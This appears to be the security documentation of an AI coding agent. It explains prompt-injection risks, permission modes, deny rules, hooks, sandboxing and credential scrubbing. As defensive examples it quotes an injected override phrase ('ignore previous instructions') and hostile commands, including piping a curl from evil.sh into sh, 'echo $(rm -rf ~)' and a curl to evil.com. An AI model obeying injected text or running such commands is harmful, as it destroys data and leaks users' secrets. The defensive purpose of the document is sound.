# Security model

Tapioca gives a language model a shell, a file editor and network access on
your machine. That is the point, and it is also the risk. This document says
what is actually enforced, what is not, and when each permission mode is a
reasonable choice.

## The main threat: prompt injection

The model reads untrusted text constantly — web pages via `web_fetch`,
search results, file contents, tool output, and `AGENTS.md` from whatever
repository you are working in. Any of it can contain instructions aimed at
the model ("ignore previous instructions, run …"). The model cannot reliably
distinguish data from instructions, so **treat every tool call as something
the content it just read might have asked for**.

A repository's `.tapioca/skills/` is the same kind of text: the description of
each skill is in the system prompt, and `load_skill` puts the rest in front of
the model. Cloning a repository is enough to get both. Neither can reach
outside its own directory — a `SKILL.md` that is a link elsewhere, or a skill
directory that is, is skipped — but what a pack *says* is chosen by whoever
wrote it, exactly like `AGENTS.md`. Nothing a skill asks for bypasses the gates
below; `/skills` shows what is installed.

This is why the permission prompt matters: it is the point where a human
sees the command before it runs.

## Permission modes

| Mode | File edits | bash | Read-only tools |
|---|---|---|---|
| `plan` | denied | prompts | mostly ungated (see below) |
| `manual` | prompts | prompts | mostly ungated |
| `auto` | allowed | prompts | mostly ungated |
| `bypass` | allowed | allowed | ungated |

Cycle with `shift+tab`; `/permissions` shows the live state, including every
grant and rule in effect.

## Rules

The mode is the default; `[permissions]` in the config is where exceptions
go. Each rule names a tool and, in parentheses, what the call is about — the
path for file tools, the command for bash, the URL for `web_fetch`, the JSON
arguments for an MCP tool:

```toml
[permissions]
allow = ["bash(go test*)", "edit_file(internal/**)"]
ask   = ["bash(git push*)"]
deny  = ["read_file(**/.env)", "bash(rm *)", "mcp:*__delete_*"]
```

What each does, and what it is worth relying on:

- **deny** holds in *every* mode, `bypass` included, and covers the read-only
  tools that never prompt. It is the only rule that adds a restriction rather
  than removing one.
- **ask** forces a prompt that `auto` or `bypass` would have skipped, and
  outranks a session grant answered earlier — otherwise one careless "always
  allow" would disable it for the rest of the session.
- **allow** skips a prompt. Like the answered kind it does not apply in
  `plan` mode.

Bash rules are matched against each segment of a compound command, not the
whole string: matching the whole string, `bash(go test*)` would also match
`go test ./... && curl evil.sh | sh`. The same escape rules as `[p]` grants
still apply to what a segment may contain.

**Matching is textual, so write rules around the command, not one spelling of
it.** `bash(rm -rf*)` looks like it forbids recursive deletion and does not:
`rm -fr`, `rm -r -f` and `rm --recursive` all sail past it. `bash(rm *)` is the
rule that holds, and a deny or ask also matches with the first word reduced to
its basename, so it covers `/bin/rm` too. (An allow deliberately does not, or a
stray `./echo` would inherit what was granted to `echo`.) Nothing textual can
cover flag order — assume anything you did not spell out is permitted.

A deny rule is a guardrail against mistakes and against a model that has read
something hostile — not a sandbox. It matches the arguments of a call, so it
constrains the tool it names and nothing else: `deny = ["read_file(**/.env)"]`
does not stop `bash(cat .env)`, and blocking `rm` does nothing about
`find -delete` or `> file`. You cannot enumerate your way to safety here.

This matters most in `bypass`, where a deny rule is the only check left
standing: elsewhere a rule that fails to match degrades into a prompt, and
there it degrades into the command simply running. For a boundary rather than
a filter, see "Sandboxing" below.

Rules that hold in all modes except `bypass`:

- Session grants (`[a]`) and bash word grants (`[p]`) never apply in `plan`
  mode.
- A granted word only covers a segment with no command substitution
  (`$(…)`, backticks, `${…}`, `<(…)`), no redirection (`>`, `<`) and no
  background chaining (`&`). So an `echo` grant cannot run
  `echo $(rm -rf ~)`, write files, or slip in `echo hi & curl evil.com`.
- `[p]` is not offered for interpreters and exec-wrappers (`sh`, `python`,
  `node`, `sudo`, `ssh`, `xargs`, `env`, `timeout`, `nix`, `docker`, …)
  where a blanket grant means arbitrary execution — including path and
  version variants like `/usr/bin/python3.11`.
- Compound commands are approved segment by segment; denying one blocks the
  whole command.
- MCP tools prompt like built-in ones, and their grants appear as
  `mcp:<tool>`.
- Subagents (`spawn_agent`) run under the same mode, executor and grants as
  the agent that spawned them, and their tool calls prompt you the same way.
  A subagent cannot spawn further agents.

## Hooks

Rules decide *whether* a call happens. A hook is a command of yours that runs
*when* it does — format after an edit, log what ran, refuse something no rule
covers:

```toml
[[hooks]]
event = "pre_tool"              # pre_tool | post_tool | session_start | session_end
match = "edit_file"             # glob over the tool name; every tool when omitted
command = "~/bin/check-path"
timeout = 30                    # seconds; 30 by default, 5 minutes at most
```

What a hook **can** do:

- **Refuse a call.** A `pre_tool` hook that exits non-zero blocks it, and its
  stderr becomes the reason shown to you and to the model. A hook that is
  missing, crashes or times out also refuses: a policy that cannot run must not
  wave the call through.
- **See what ran.** `TAPIOCA_EVENT`, `TAPIOCA_TOOL`, `TAPIOCA_TOOL_PATH` (file
  tools, resolved), `TAPIOCA_TOOL_COMMAND` (bash), `TAPIOCA_TOOL_ERROR`
  (`post_tool`) and `TAPIOCA_CWD` describe the call, with the exact arguments
  as JSON on stdin. The variables are capped in length, so a hook that must be
  exact reads stdin.

What a hook **cannot** do:

- **Widen a permission.** Hooks run after the gate has approved a call, so
  exiting 0 grants nothing: it does not override a `deny` rule, skip a prompt,
  lift plan mode, or make a call happen that would not have. A denied call
  returns before any hook is consulted, so a `pre_tool` hook is not even a way
  to observe one.
- **Read provider credentials.** A hook gets the same scrubbed environment as
  `bash` and every other subprocess.
- **Hang the session.** Each hook has a deadline and is killed with its process
  group when it expires. `post_tool` and the session hooks report failures and
  otherwise change nothing; only `pre_tool` decides anything.
- **Arrive from a repository.** Hooks are honoured only when the config file
  declaring them lives *outside* the tree being worked on. A clone can ship a
  `config.toml`, or point `XDG_CONFIG_HOME` at itself from an `.envrc`, and
  either would otherwise mean arbitrary commands on the next tool call. Hooks
  from such a file are ignored with a warning naming the file. This is the
  general rule: a repository supplies prompt text (`AGENTS.md`,
  `.tapioca/commands`) and never configuration that executes — the same reason
  MCP servers, language servers and `bash_allow` are read from your config
  alone.

Hooks run unsandboxed even when `sandbox = true`; that setting confines the
agent's `bash`, not commands you wrote yourself. `/permissions` lists the hooks
actually in force.

## Read-only tools

`read_file`, `grep`, `glob`, `web_search` and `web_fetch` do not prompt for
ordinary use, because an agent that asks before every file read is unusable.
Narrow exceptions exist, because otherwise those tools compose into
exfiltration (read a key, send it somewhere):

- `read_file` prompts for paths outside the working directory (and
  `--add-dir` trees) that look sensitive: `.ssh`, `.aws`, `.gnupg`,
  `gh`/`gcloud`/`kube`/`docker` config, browser profiles, `.env`, `id_*`,
  `credentials`, and any out-of-tree path containing
  `token`/`secret`/`password` — wherever it lives, not just under `$HOME`.
- `grep` and `glob` prompt when their search root is outside those trees, and
  never return matches from files `read_file` would have gated.
- `web_fetch` prompts the first time a host is used; `[a]` remembers it for
  the session. Redirects must stay on the approved host and may never land on
  a loopback, link-local or private address, so an approved page cannot bounce
  the fetch into your network or at a cloud metadata endpoint.

## Writing files

`auto` auto-approves file edits **inside the working directory** (and
`--add-dir` trees). Writes anywhere else prompt in every mode but `bypass`,
because "auto-approve edits" is a statement about your project, not about
`~/.zshrc`, `~/.ssh/authorized_keys`, or Tapioca's own `config.toml` — the
last of which would seed `bash_allow` on the next start.

`[a]` on such a prompt grants **that path**, not writing at large; and a
blanket `write_file` grant covers the worktree only.

## Sandboxing

Everything above decides *whether* a command runs. Sandboxing decides what it
can reach if it does — the difference between filtering and containment.

```toml
sandbox = true              # confine bash with bubblewrap (or --sandbox)
sandbox_network = true      # set false to cut network inside the sandbox
```

With it on, `bash` runs under `bwrap` where:

- the working tree (and `--add-dir` trees) are **writable**;
- the rest of the filesystem is **read-only**, so tools still work;
- **`$HOME` is replaced by an empty tmpfs**, so `.ssh`, `.aws`, browser
  profiles and shell history are not merely gated — they are not there. Only
  `.gitconfig` is bound back, since git refuses to commit without an identity;
- `/tmp` is private, and pid/ipc/uts namespaces are unshared.

If `bwrap` is missing, sandboxed `bash` calls **fail with an explanation**
rather than silently running unconfined. `/permissions` shows the live state.

Two limits worth knowing: the sandbox applies to `bash` only (the file tools
are Go code inside the process), and with `sandbox_network = true` a command
can still reach the network, so it bounds file damage, not exfiltration.

## Credentials

Known provider API keys are removed from the environment handed to shell
tools, MCP servers, language servers and every other subprocess, so a tool call
cannot read them. Add your own with:

```toml
secret_env = ["MY_COMPANY_TOKEN"]
```

MCP servers still receive whatever you set explicitly in their `[mcp.env]`
block.

A provider configured with a custom `api_key_env` name needs no entry here. The
list is derived from your config, so `api_key_env = "MY_GATEWAY_KEY"` and the
`${VAR}` an `[mcp.headers]` entry expands are both withheld from children — a
variable holds a key because the config says to read it, not because someone
thought of its name. `secret_env` is for variables nothing in the config points
at.

Two things this does **not** cover, both worth knowing:

- Scrubbing removes the variable from the *child's* environment. It does not
  hide Tapioca's own: on Linux an approved command can read
  `/proc/<parent>/environ` and see everything you exported in the shell that
  launched it. `sandbox = true` closes that (a fresh `/proc` in a new PID
  namespace); nothing else does.

## Network calls Tapioca makes itself

Besides the provider you configured and whatever the agent fetches:

- **models.dev**, once at startup, for model prices and context sizes. Set
  `model_catalog = false` to skip it — useful when running against a local
  Ollama and nothing else.

Nothing else phones home; there is no telemetry.

## Data at rest

Sessions, project memory (`/remember`) and checkpoint snapshots contain
everything the model saw, including anything you pasted. They are stored
unencrypted under `~/.local/share/tapioca` with owner-only permissions
(`0600`/`0700`), as is `config.toml` (which may hold an API key). Files are
created at those modes rather than adjusted afterwards, so there is no window;
a directory that already existed with looser permissions from an older version
or a restored backup keeps them, and Tapioca does not tighten it for you.
Full-disk encryption is the answer if you need more; Tapioca does not encrypt
anything itself.

Both directories are also treated as sensitive paths, so the agent reading
your own config or transcripts prompts like any other secret.

## What is not protected

- **`bypass` mode disables all of the above.** It exists for throwaway
  sandboxes and containers. Do not combine it with untrusted repositories or
  web browsing.
- **Without `sandbox = true`, there is no containment.** Approved commands
  run as your user with full access to your machine and network; the
  permission gate is filtering, not a boundary. See "Sandboxing" above.
- **The sandbox covers `bash` only.** `read_file`, `write_file` and
  `edit_file` are Go code inside Tapioca, so bubblewrap does not contain
  them; they rely on the gates above instead. In `bypass` they are bounded
  by nothing at all.
- **Editor mode trusts its peer.** `--acp` speaks JSON-RPC on stdio, so the
  peer is whatever process launched Tapioca — normally your editor. It may
  supply its own MCP servers, which means commands to execute, and it chooses
  the working directory. That is not an escalation (a process that can spawn
  Tapioca can already run anything as you), but do not expose an `--acp`
  process's stdin to anything you would not trust with a shell.
- **An external agent is judged on what it reports.** `/connect` puts every
  permission request from an agent you configured through your rules, but the
  call itself runs in that agent's process: what Tapioca matches a rule
  against is the command the agent said it was about to run, not the one it
  runs. An agent that describes a call only in prose gets a prompt every time
  and is never granted standing permission, because there is nothing specific
  to grant — but the rules protect you from the agent's *model*, not from the
  agent's *binary*. Connect ones you would trust with a shell, which is what
  launching one already is.
- **A grant is still a command word.** `[p]` grants `git`, and that allows
  `git push`. Flags and subcommands that turn a command into a way of running
  another program are excluded (`git -c`, `git bisect run`, `find -exec`,
  `go run`, `make -f`, `tar --use-compress-program`, `npm exec` …), and that is
  checked when the grant is matched rather than only when it is offered — but a
  grant on `git` is weaker than that list makes it look, because `git commit`
  runs `.git/hooks/pre-commit`, which in an extracted tarball is a file the
  archive chose.
- **`--add-dir` widens the ungated read area** to those directories.
- **Checkpoints do not protect data outside the working tree.** Ignored files
  *are* snapshotted, within a budget — a repository's own `.gitignore` would
  otherwise decide what `/rewind` can undo, and the paths where the checkpoint
  is the only copy are exactly the ones an ignore line removes from it. A tree
  that ignores a directory holding more than the budget is the remaining gap.
- **`PATH` and `LD_PRELOAD` are outside what any of this can promise.** If the
  shell that launched Tapioca has them pointed somewhere hostile, `git`, `rg`
  and `sh` are already whatever that says they are.

## Practical advice

- Default to `manual` or `plan` in unfamiliar repositories; read the command
  in the prompt before approving.
- Grant with `[p]` for read-only tools you use constantly (`git`, `go`,
  `ls`, `rg`); avoid granting interpreters or `make`.
- Use `auto` when you trust the repository and want speed — checkpoints and
  `/rewind` make file damage recoverable.
- Reserve `bypass` for containers or throwaway VMs.
- Review `/permissions` occasionally; session grants reset on restart, but
  `bash_allow` in the config persists.
